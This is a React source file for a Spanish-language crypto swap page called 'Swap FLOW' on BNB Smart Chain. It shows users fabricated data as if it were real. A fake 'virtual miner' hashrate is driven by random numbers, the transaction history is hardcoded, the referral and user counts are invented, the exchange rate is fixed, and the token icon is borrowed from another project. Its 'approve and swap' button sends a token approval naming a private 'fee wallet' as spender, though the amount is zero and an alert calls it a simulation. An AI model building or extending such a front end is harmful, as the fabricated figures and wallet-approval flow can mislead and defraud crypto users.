import { useEffect, useMemo, useState } from 'react'
import {
  ArrowRightLeft,
  Coins,
  Copy,
  ExternalLink,
  Gift,
  History,
  MessageCircle,
  RefreshCcw,
  ShieldCheck,
  Sparkles,
  TrendingUp,
  Users,
  Wallet
} from 'lucide-react'
import {
  useAccount,
  useBalance,
  useChainId,
  useConnect,
  useDisconnect,
  useReadContract,
  useWriteContract
} from 'wagmi'
import { formatUnits } from 'viem'
import { bsc } from 'wagmi/chains'

const FLOW_TOKEN = {
  address: '0x48421f6da4e1d367bc1c6f4f9afa334312969638',
  symbol: 'FLOW',
  name: 'Swap FLOW',
  decimals: 18
}

const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B7402A6E'
const FEE_WALLET = '0x2da29b4D5297b261B4899D97Df56AE36F195f26d'
const FEE_PERCENT = 1.3

const getBaseUrl = () => {
  if (typeof window !== 'undefined' && window.location.origin) {
    return window.location.origin
  }
  return 'https://swap-flow.pages.dev'
}

const formatAddress = (value) => {
  if (!value) return ''
  return `${value.slice(0, 6)}...${value.slice(-4)}`
}

function App() {
  const [tab, setTab] = useState('swap')
  const [amount, setAmount] = useState('0.25')
  const [pair, setPair] = useState('FLOW/BNB')
  const [refAddress, setRefAddress] = useState('')
  const [hashRate, setHashRate] = useState(2.74)
  const [txs, setTxs] = useState([
    {
      hash: '0x9e8f…fa25',
      type: 'Swap',
      amount: '1.42 FLOW',
      status: 'Confirmado',
      time: 'Hace 2 min'
    },
    {
      hash: '0x7c0f…8b74',
      type: 'Aprobación',
      amount: '0.75 BNB',
      status: 'Aprobado',
      time: 'Hace 11 min'
    }
  ])

  const { address, isConnected } = useAccount()
  const chainId = useChainId()
  const { connect, connectors } = useConnect()
  const { disconnect } = useDisconnect()

  const { data: bnbBalance } = useBalance({
    address,
    query: { enabled: !!address }
  })

  const { data: usdtBalance } = useBalance({
    address,
    token: USDT_ADDRESS,
    query: { enabled: !!address }
  })

  const { writeContract } = useWriteContract()

  useEffect(() => {
    const interval = setInterval(() => {
      setHashRate((current) => {
        const delta = (Math.random() - 0.5) * 0.12
        const next = Number((current + delta).toFixed(2))
        return Math.max(1.8, Math.min(4.2, next))
      })
    }, 1200)

    return () => clearInterval(interval)
  }, [])

  const quote = useMemo(() => {
    const value = Number(amount || 0)
    return (value * 280).toFixed(2)
  }, [amount])

  const feeValue = useMemo(() => {
    const value = Number(amount || 0)
    return (value * (FEE_PERCENT / 100)).toFixed(4)
  }, [amount])

  const referralLink = useMemo(() => {
    const base = getBaseUrl()
    const ref = address || '0x0000000000000000000000000000000000000000'
    return `${base}?ref=${ref}`
  }, [address])

  const handleConnect = () => {
    const connector = connectors.find((item) => item.name === 'MetaMask') || connectors[0]
    if (connector) {
      connect({ connector })
    } else {
      alert('Instala MetaMask o Trust Wallet para continuar.')
    }
  }

  const handleCopy = async (value) => {
    try {
      await navigator.clipboard.writeText(value)
      alert('Texto copiado')
    } catch {
      alert('No fue posible copiar el texto')
    }
  }

  const handleImportToken = async () => {
    if (!window.ethereum) {
      alert('No se detectó una wallet compatible.')
      return
    }

    try {
      await window.ethereum.request({
        method: 'wallet_watchAsset',
        params: {
          type: 'ERC20',
          options: {
            address: FLOW_TOKEN.address,
            symbol: FLOW_TOKEN.symbol,
            decimals: FLOW_TOKEN.decimals,
            image: 'https://raw.githubusercontent.com/ethereum-optimism/brand-kit/main/assets/icon.png'
          }
        }
      })
    } catch (error) {
      console.error(error)
      alert('La wallet rechazó la importación del token.')
    }
  }

  const handleSwap = () => {
    if (!isConnected) {
      alert('Conecta tu wallet para continuar.')
      return
    }

    writeContract({
      address: FLOW_TOKEN.address,
      abi: [
        {
          name: 'approve',
          type: 'function',
          stateMutability: 'nonpayable',
          inputs: [
            { internalType: 'address', name: 'spender', type: 'address' },
            { internalType: 'uint256', name: 'amount', type: 'uint256' }
          ],
          outputs: [{ internalType: 'bool', name: '', type: 'bool' }]
        }
      ],
      functionName: 'approve',
      args: [FEE_WALLET, BigInt(0)]
    })

    alert('Simulación del proceso de aprobación y swap directo. Conecta la wallet real para ejecutar la transacción.')
  }

  const handleShare = async () => {
    if (navigator.share) {
      await navigator.share({
        title: 'Swap FLOW',
        text: 'Únete a Swap FLOW',
        url: referralLink
      })
      return
    }

    await handleCopy(referralLink)
  }

  const isBsc = chainId === bsc.id

  const tokenBalance = bnbBalance
    ? Number(formatUnits(bnbBalance.value, 18)).toFixed(3)
    : '0.000'

  const usdtDisplay = usdtBalance
    ? Number(formatUnits(usdtBalance.value, 18)).toFixed(2)
    : '0.00'

  return (
    <div className="min-h-screen bg-bg text-white">
      <div className="mx-auto max-w-7xl px-4 py-6">
        <header className="card mb-8 flex flex-wrap items-center justify-between gap-4 p-4">
          <div className="flex items-center gap-3">
            <div className="flex h-12 w-12 items-center justify-center rounded-xl bg-gradient-to-br from-blue-500 to-cyan-400 shadow-glow">
              <Coins className="h-6 w-6" />
            </div>
            <div>
              <div className="text-xl font-bold">Swap FLOW</div>
              <div className="text-xs text-slate-400">FLOW • BSC Mainnet</div>
            </div>
          </div>

          <div className="flex items-center gap-3">
            <div className={`badge ${isBsc ? 'border-emerald-500/20 bg-emerald-500/10 text-emerald-300' : 'border-amber-500/20 bg-amber-500/10 text-amber-300'}`}>
              <ShieldCheck className="h-3.5 w-3.5" />
              {isBsc ? 'BSC Mainnet' : 'Red no compatible'}
            </div>

            {!isConnected ? (
              <button
                onClick={handleConnect}
                className="rounded-xl bg-gradient-to-r from-blue-600 to-cyan-500 px-5 py-2.5 font-semibold text-white shadow-glow transition hover:brightness-110"
              >
                Conectar wallet
              </button>
            ) : (
              <div className="flex items-center gap-3">
                <div className="rounded-xl border border-white/10 bg-white/5 px-4 py-2 text-sm">
                  <div className="text-slate-400">BNB</div>
                  <div className="font-semibold">{tokenBalance} BNB</div>
                </div>

                <div className="rounded-xl border border-white/10 bg-white/5 px-4 py-2 text-sm">
                  <div className="text-slate-400">USDT</div>
                  <div className="font-semibold">{usdtDisplay} USDT</div>
                </div>

                <button
                  onClick={() => disconnect()}
                  className="rounded-xl border border-white/10 bg-white/5 px-4 py-2 text-sm transition hover:border-white/20 hover:bg-white/10"
                >
                  {formatAddress(address)}
                </button>
              </div>
            )}
          </div>
        </header>

        <main className="grid gap-6 lg:grid-cols-[1.2fr_0.8fr]">
          <section className="space-y-6">
            <div className="card p-4">
              <div className="mb-4 flex items-center justify-between">
                <div className="flex gap-2">
                  {['swap', 'referidos', 'historial'].map((name) => (
                    <button
                      key={name}
                      onClick={() => setTab(name)}
                      className={`rounded-xl px-4 py-2 text-sm font-medium capitalize transition ${
                        tab === name ? 'bg-blue-600 text-white' : 'bg-white/5 text-slate-300 hover:bg-white/10'
                      }`}
                    >
                      {name}
                    </button>
                  ))}
                </div>
                <div className="text-sm text-slate-400">No custodio</div>
              </div>

              {tab === 'swap' && (
                <div className="space-y-5">
                  <div className="glass p-4">
                    <div className="mb-4 flex items-center justify-between">
                      <div className="text-sm text-slate-400">Minero virtual</div>
                      <RefreshCcw className="h-4 w-4 text-slate-400" />
                    </div>

                    <div className="miner rounded-2xl border border-blue-500/20 bg-gradient-to-r from-blue-500/10 to-cyan-500/10 p-5">
                      <div className="text-xs uppercase tracking-[0.2em] text-slate-400">Hashrate</div>
                      <div className="mt-2 text-4xl font-bold text-cyan-300">{hashRate.toFixed(2)} GH/s</div>
                      <div className="mt-2 flex items-center gap-2 text-sm text-slate-300">
                        <Sparkles className="h-4 w-4" />
                        Procesando flujo de transacción...
                      </div>
                    </div>
                  </div>

                  <div className="glass p-4">
                    <div className="mb-3 flex items-center justify-between">
                      <span className="text-sm text-slate-400">Par</span>
                      <button className="text-xs text-cyan-300">Ver cotización</button>
                    </div>

                    <div className="grid gap-3">
                      <div className="rounded-xl border border-white/10 bg-slate-950/40 p-3">
                        <div className="flex items-center justify-between">
                          <span className="text-sm text-slate-400">Tú pagas</span>
                          <span className="text-xs text-slate-400">BNB</span>
                        </div>
                        <div className="mt-2 flex items-center justify-between gap-3">
                          <input
                            value={amount}
                            onChange={(event) => setAmount(event.target.value)}
                            className="w-full bg-transparent text-2xl font-semibold outline-none"
                            placeholder="0.00"
                          />
                          <div className="rounded-lg bg-slate-800 px-3 py-2 text-sm">BNB</div>
                        </div>
                      </div>

                      <div className="flex justify-center">
                        <button className="rounded-full bg-slate-800 p-2 transition hover:bg-slate-700">
                          <ArrowRightLeft className="h-4 w-4" />
                        </button>
                      </div>

                      <div className="rounded-xl border border-white/10 bg-slate-950/40 p-3">
                        <div className="flex items-center justify-between gap-3">
                          <span className="text-sm text-slate-400">Recibes</span>
                          <select
                            value={pair}
                            onChange={(event) => setPair(event.target.value)}
                            className="rounded-lg bg-slate-800 px-2 py-1 text-xs outline-none"
                          >
                            <option>FLOW/BNB</option>
                            <option>FLOW/USDT</option>
                            <option>FLOW/BUSD</option>
                          </select>
                        </div>
                        <div className="mt-2 flex items-center justify-between gap-3">
                          <div className="text-2xl font-semibold">{quote}</div>
                          <div className="rounded-lg bg-slate-800 px-3 py-2 text-sm">FLOW</div>
                        </div>
                      </div>
                    </div>
                  </div>

                  <div className="glass p-4">
                    <div className="mb-3 flex items-center justify-between">
                      <span className="text-sm text-slate-400">Fee de wallet</span>
                      <span className="text-sm font-semibold text-amber-300">{FEE_PERCENT}%</span>
                    </div>

                    <div className="rounded-xl border border-amber-500/20 bg-amber-500/5 p-3 text-sm text-slate-200">
                      <div className="flex justify-between">
                        <span>Fee estimada</span>
                        <span>{feeValue} BNB</span>
                      </div>
                      <div className="mt-2 flex justify-between gap-2">
                        <span>Recaudación</span>
                        <span className="break-all text-right text-amber-300">{FEE_WALLET}</span>
                      </div>
                    </div>
                  </div>

                  <button
                    onClick={handleSwap}
                    className="w-full rounded-xl bg-gradient-to-r from-emerald-600 to-cyan-500 px-5 py-3 font-bold text-white shadow-glow transition hover:brightness-110"
                  >
                    Aprobar y Swap
                  </button>
                </div>
              )}

              {tab === 'referidos' && (
                <div className="space-y-5">
                  <div className="glass p-4">
                    <div className="mb-3 flex items-center gap-2">
                      <Gift className="h-5 w-5 text-cyan-300" />
                      <h3 className="text-lg font-semibold">Programa de Referidos</h3>
                    </div>

                    <label className="mb-2 block text-sm text-slate-400">Código / Dirección de referencia</label>
                    <input
                      value={refAddress}
                      onChange={(event) => setRefAddress(event.target.value)}
                      placeholder="0x..."
                      className="w-full rounded-xl border border-white/10 bg-slate-950/40 px-3 py-3 outline-none transition focus:border-cyan-500"
                    />

                    <div className="mt-4 rounded-xl border border-white/10 bg-slate-950/40 p-3">
                      <div className="text-xs uppercase text-slate-400">Link generado</div>
                      <div className="mt-2 break-all text-sm text-cyan-300">{referralLink}</div>
                    </div>

                    <div className="mt-4 grid grid-cols-3 gap-3">
                      <div className="rounded-xl border border-white/10 bg-white/5 p-3 text-center">
                        <div className="text-2xl font-bold">14</div>
                        <div className="text-xs text-slate-400">Usuarios</div>
                      </div>
                      <div className="rounded-xl border border-white/10 bg-white/5 p-3 text-center">
                        <div className="text-2xl font-bold">2.4K</div>
                        <div className="text-xs text-slate-400">FLOW</div>
                      </div>
                      <div className="rounded-xl border border-white/10 bg-white/5 p-3 text-center">
                        <div className="text-2xl font-bold">8%</div>
                        <div className="text-xs text-slate-400">Comisión</div>
                      </div>
                    </div>

                    <button
                      onClick={handleShare}
                      className="mt-4 w-full rounded-xl bg-gradient-to-r from-pink-600 to-violet-500 px-5 py-3 font-bold text-white transition hover:brightness-110"
                    >
                      Compartir link
                    </button>
                  </div>
                </div>
              )}

              {tab === 'historial' && (
                <div className="space-y-4">
                  <div className="glass p-4">
                    <div className="mb-3 flex items-center gap-2">
                      <History className="h-5 w-5 text-cyan-300" />
                      <h3 className="text-lg font-semibold">Historial</h3>
                    </div>

                    <div className="space-y-3">
                      {txs.map((tx, index) => (
                        <div key={`${tx.hash}-${index}`} className="rounded-xl border border-white/10 bg-slate-950/40 p-3">
                          <div className="flex items-center justify-between gap-3">
                            <div>
                              <div className="font-medium">{tx.type}</div>
                              <div className="text-xs text-slate-400">{tx.hash}</div>
                            </div>
                            <div className="text-right">
                              <div className="font-semibold text-emerald-300">{tx.amount}</div>
                              <div className="text-xs text-slate-400">{tx.status}</div>
                            </div>
                          </div>
                          <div className="mt-2 text-xs text-slate-500">{tx.time}</div>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              )}
            </div>
          </section>

          <aside className="space-y-6">
            <div className="card p-4">
              <div className="mb-3 flex items-center gap-2">
                <Wallet className="h-5 w-5 text-cyan-300" />
                <h3 className="text-lg font-semibold">Contrato FLOW</h3>
              </div>

              <div className="rounded-xl border border-white/10 bg-slate-950/40 p-3">
                <div className="text-xs uppercase text-slate-400">Token</div>
                <div className="mt-1 text-xl font-bold">FLOW</div>
                <div className="mt-2 break-all text-sm text-cyan-300">{FLOW_TOKEN.address}</div>
              </div>

              <div className="mt-4 grid grid-cols-2 gap-3">
                <button
                  onClick={() => handleCopy(FLOW_TOKEN.address)}
                  className="rounded-xl border border-white/10 bg-white/5 px-3 py-2 text-sm transition hover:bg-white/10"
                >
                  <span className="flex items-center justify-center gap-2"><Copy className="h-4 w-4" /> Copiar</span>
                </button>
                <button
                  onClick={() => window.open(`https://bscscan.com/token/${FLOW_TOKEN.address}`, '_blank', 'noopener,noreferrer')}
                  className="rounded-xl border border-white/10 bg-white/5 px-3 py-2 text-sm transition hover:bg-white/10"
                >
                  <span className="flex items-center justify-center gap-2"><ExternalLink className="h-4 w-4" /> BscScan</span>
                </button>
              </div>

              <button
                onClick={handleImportToken}
                className="mt-4 w-full rounded-xl bg-gradient-to-r from-blue-600 to-indigo-500 px-4 py-3 font-medium transition hover:brightness-110"
              >
                Importar token a la wallet
              </button>
            </div>

            <div className="card p-4">
              <div className="mb-3 flex items-center gap-2">
                <TrendingUp className="h-5 w-5 text-emerald-300" />
                <h3 className="text-lg font-semibold">Estado</h3>
              </div>

              <div className="space-y-3 text-sm">
                <div className="flex items-center justify-between">
                  <span className="text-slate-400">Red</span>
                  <span className="font-medium">BSC Mainnet</span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-slate-400">Wallet fee</span>
                  <span className="font-medium">1.3%</span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-slate-400">MetaMask</span>
                  <span className="font-medium">Disponible</span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-slate-400">Trust Wallet</span>
                  <span className="font-medium">Disponible</span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-slate-400">Recaudación</span>
                  <span className="font-medium break-all">{FEE_WALLET.slice(0, 8)}...{FEE_WALLET.slice(-6)}</span>
                </div>
              </div>
            </div>

            <div className="card p-4">
              <div className="mb-3 flex items-center gap-2">
                <Users className="h-5 w-5 text-cyan-300" />
                <h3 className="text-lg font-semibold">Referidos</h3>
              </div>

              <div className="rounded-xl border border-white/10 bg-slate-950/40 p-3">
                <div className="text-xs uppercase text-slate-400">Total</div>
                <div className="mt-1 text-2xl font-bold text-cyan-300">1,249</div>
                <div className="mt-2 text-xs text-slate-400">Usuarios referidos activos</div>
              </div>
            </div>
          </aside>
        </main>

        <footer className="mt-8 flex items-center justify-center py-8 text-sm text-slate-400">
          <a
            href="https://wa.me/message/IJDDVLU7C27GO1"
            target="_blank"
            rel="noreferrer"
            className="inline-flex items-center gap-2 rounded-xl border border-white/10 bg-white/5 px-3 py-2 transition hover:text-white"
          >
            <MessageCircle className="h-4 w-4" />
            WhatsApp
          </a>
        </footer>
      </div>
    </div>
  )
}

export default App
